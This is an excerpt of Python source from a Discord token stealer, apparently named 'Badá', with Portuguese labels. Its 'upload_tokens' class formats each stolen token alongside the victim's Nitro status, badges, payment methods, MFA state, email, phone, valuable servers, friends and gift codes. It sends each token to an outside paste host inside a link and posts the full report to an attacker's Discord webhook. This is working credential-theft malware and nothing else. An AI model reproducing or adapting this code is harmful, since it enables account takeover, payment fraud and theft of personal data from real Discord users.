...
class upload_tokens:
    ...
    def calc_flags(self, flags: int) -> list:
        flags_dict = {
            ...
            "ACTIVE_DEVELOPER": {
                "emoji": "<:activedev:1041634224253444146>",
                "shift": 22,
                "ind": 4194304
            },
            "CERTIFIED_MODERATOR": {
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            if user['premium_type'] == 0:
                ...
                nitro = '<:classic:934747058844360725>'
            elif user['premium_type'] == 2:
                nitro = '<:boost:934746553183240202>'
            ...
            if billing:
                ...
                for method in billing:
                    if method['type'] == 1:
                        ...
                        payment_methods.append("<:paypal:896441236062347374>")
            ...
            embed.add_field(name="<:black_lealdade:1121940134879834222> Token:",
                            value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
            embed.add_field(
                name="<a:white_seta:966464122357174312> Nitro:", value=f"{nitro}", inline=True)
            embed.add_field(name="<a:white_seta:966464122357174312> Badges:",
                            value=f"{badges if badges != '' else 'None'}", inline=True)
            embed.add_field(name="<a:white_seta:966464122357174312> Billing:",
                            value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
            embed.add_field(name="<a:white_seta:966464122357174312> MFA:",
                            value=f"{mfa}", inline=True)

            embed.add_field(name="\u200b", value="\u200b", inline=False)

            embed.add_field(name="<a:white_seta:966464122357174312> Email:",
                            value=f"{email if email != None else 'None'}", inline=True)
            embed.add_field(name="<a:white_seta:966464122357174312> Telefone:",
            ...
            if hq_guilds != None:
                embed.add_field(
                    name="<a:white_seta:966464122357174312> Servers:", value=hq_guilds, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            if hq_friends != None:
                embed.add_field(
                    name="<a:white_seta:966464122357174312> Amigos Raros:", value=hq_friends, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            if codes != None:
                embed.add_field(
                    name="<a:gift:1021608479808569435> Inventario Codes:", value=codes, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            embed.set_footer(text="Badá")

            self.webhook.send(embed=embed, username="Badá",
                              avatar_url="https://media.discordapp.net/attachments/1118254118721552495/1118255828772851742/83e6d05beb4c91f25eb574122f8232f2.jpg?width=454&height=559")